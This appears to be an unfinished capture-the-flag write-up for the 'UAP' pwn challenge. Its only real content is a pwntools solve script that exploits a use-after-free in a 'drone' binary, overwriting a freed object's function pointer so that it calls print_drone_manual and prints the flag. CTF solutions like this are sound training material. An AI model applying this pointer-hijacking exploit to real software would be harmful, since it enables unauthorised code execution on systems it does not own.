# 1337 Up | UAP - PWN (100)

In progress

## Initial Analysis
How to get the building blocks of ideas for exploitation

## Exploitation
How to exploit after initial analysis

## Solve
``` python
from pwn import *

BINARY = './drone'
HOST = ''
GDB_SCRIPT = ''

def main():
    proc = get_process() # set is_remote = False for local testing

    select_menu = lambda option: proc.sendlineafter(b'Exit', option)

    print_manual_addr = 0x00400836
    payload = b''.join([
        b'A'*0x10,
        p64(print_manual_addr),
        b'A'*0x8
    ])

    # Create drone
    select_menu(b'1') # Create drone

    # Retire drone
    select_menu(b'2') # Free drone
    proc.sendlineafter(b'Enter drone ID to retire: ', b'1')

    # Replace start_route with print_drone_manual
    select_menu(b'4')
    proc.sendlineafter(b'Enter the drone route data: ', payload)

    # Execute print_drone_manual
    select_menu(b'3')
    proc.sendlineafter(b'Enter drone ID to start its route: ', b'1')

    flag = proc.recvline().strip().decode()
    print(f'Flag: {flag}')

# Allows compatibility if custom library isn't present
try:
    from ctfkit.bp import *
    tpwn.GDB_SCRIPT = GDB_SCRIPT
except ImportError:
    def get_process(is_remote=True):
        host, port = HOST.split(':')
        return remote(host, int(port)) if is_remote else process()

if __name__ == '__main__':
    try:
        context.binary = BINARY
    except FileNotFoundError:
        print('Not able to load binary, local testing disabled')
    context.log_level = 'error'
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

    parse_args()
    main()

```